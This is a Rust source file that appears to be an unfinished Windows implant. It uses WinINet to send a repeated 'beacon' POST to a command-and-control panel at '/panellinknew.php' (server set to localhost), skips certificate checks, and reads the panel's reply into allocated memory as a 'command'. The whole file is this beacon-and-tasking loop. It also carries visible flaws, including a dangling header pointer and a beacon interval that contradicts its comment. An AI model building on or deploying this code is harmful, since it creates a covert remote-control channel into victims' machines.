use winapi::shared::minwindef::{LPDWORD, LPVOID, LPWORD};
use winapi::shared::ntdef::LPCSTR;
use winapi::um::synchapi::Sleep;
use winapi::um::wininet::{HttpOpenRequestA, HttpSendRequestA, InternetConnectA, InternetOpenA, InternetQueryDataAvailable, InternetReadFile, HINTERNET, INTERNET_FLAG_HYPERLINK, INTERNET_FLAG_IGNORE_CERT_CN_INVALID, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP, INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS, INTERNET_FLAG_NO_AUTH, INTERNET_FLAG_NO_CACHE_WRITE, INTERNET_FLAG_NO_UI, INTERNET_FLAG_PRAGMA_NOCACHE, INTERNET_FLAG_RELOAD, INTERNET_OPEN_TYPE_PRECONFIG, INTERNET_SERVICE_HTTP};
use winapi::um::winhttp::WINHTTP_FLAG_ASYNC;
use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE};
use winsafe::GetLastError;
use std::ptr::{self, null_mut};
use std::mem;
use std::ffi::{CStr, CString};
use winapi::ctypes::c_void;
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};

pub fn network()  {
    unsafe{
        let agent: String = String::from("payload version1.0");
        let  io_handle: HINTERNET ;
        let  ic_handle: HINTERNET ;
        let  or_handle: HINTERNET ;
        let server_ip: String = String::from("localhost");
        // let panel_address: String = String::from("/panellink.php");
        // let version = String::from("HTTP/1.1");
        // let post_string = String::from("POST");
        let panel_address: CString = CString::new("/panellinknew.php").expect("CString::new failed");
        let version: CString = CString::new("HTTP/1.1").expect("CString::new failed");
        let post_string: CString = CString::new("POST").expect("CString::new failed");

        io_handle = InternetOpenA(agent.as_ptr() as *const i8, INTERNET_OPEN_TYPE_PRECONFIG, ptr::null_mut(),  ptr::null_mut(), /*WINHTTP_FLAG_ASYNC*/ 0 ); //creates a session context to maintain details about the HTTP session

        println!("[*] Error report from InternetOpenA API{}", GetLastError());


        ic_handle = InternetConnectA(io_handle, server_ip.as_ptr() as *const i8, 80, ptr::null_mut(), ptr::null_mut(), INTERNET_SERVICE_HTTP, 0, 0);

        println!("[*] Error report from InternetConnectA API{}", GetLastError());



        if ic_handle != ptr::null_mut() {    
            or_handle = HttpOpenRequestA(ic_handle, post_string.as_ptr() , panel_address.as_ptr(), version.as_ptr(), ptr::null_mut(), ptr::null_mut() , INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
            INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_AUTH |
            INTERNET_FLAG_NO_CACHE_WRITE |
            INTERNET_FLAG_NO_UI |
            INTERNET_FLAG_PRAGMA_NOCACHE |
            INTERNET_FLAG_RELOAD, 0 );
            println!("[*] Requesting for panel, {}", GetLastError());
            loop {
                if !or_handle.is_null() {
                    //let  content_type: CString = CString::new("Content-Type: application/x-www-form-urlencoded").expect("CString::new failed");

                    let content_type: LPCSTR = String::from("Content-Type: application/x-www-form-urlencoded").as_ptr() as *const i8;


                    let mut beacon = String::from("beacon='zinda hu yaar kaafi hai'");
                    //beacon1.as_mut_ptr() as *mut c_void;

                    //send a beacon bydefault send beacon in every 2 sec. if we get different beacon time interval then change it to new time.
                    HttpSendRequestA(or_handle, content_type ,  /*mem::size_of_val(&content_type) as u32*/47, beacon.as_mut_ptr() as *mut c_void , beacon.len() as u32);
                    println!("[*] Sending beacon to panel, {}", GetLastError());
                    
            
                    let mut bytes_to_read: u32 = 0;
                    //let bytes_to_read_ptr: *mut u32 = &mut bytes_to_read;
                    let _result: i32 = InternetQueryDataAvailable(or_handle,   &mut bytes_to_read, 0, 0);
                    //println!("[*] quering if any data is present from panel., {}", GetLastError());
                    //if *bytes_to_read_ptr != 0 {
                        println!("Bytes to read from panel is: {}",  bytes_to_read );
                    //}
                
                    if bytes_to_read != 0 {
                        let command_c2:LPVOID = VirtualAlloc(std::ptr::null_mut(), bytes_to_read as usize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                        
                        //println!("last error for VirtualAlloc: {}", GetLastError());

                        let _bytes_read_from_c2: *mut u32 = ptr::null_mut();

                        let mut bytes_read_from_c2: u32 = 0;
                        //let bytes = bytes_to_read;
                        InternetReadFile(or_handle, command_c2, bytes_to_read, /*bytes_read_from_c2 as *mut u32*/&mut bytes_read_from_c2 as *mut u32);
                        
                        //*(command_c2 as *mut u32);

                        //let rust_str = CStr::from_ptr(command_c2).to_str().unwrap();
                        //println!("command: {} {}", *(command_c2 as *mut u32), GetLastError());
                        let buffer = std::slice::from_raw_parts(command_c2 as *const u8, bytes_read_from_c2 as usize);
                        match std::str::from_utf8(buffer) {
                        Ok(valid_str) => println!("command: {}", valid_str),
                        Err(_) => println!("command (raw bytes): {:?}", buffer),
                        }
                        VirtualFree(command_c2, 0, MEM_RELEASE);
                    }
                    Sleep(1000);
                    
                }   
            }
        }
    }

        


        
        
        
        
        
        
        
        

}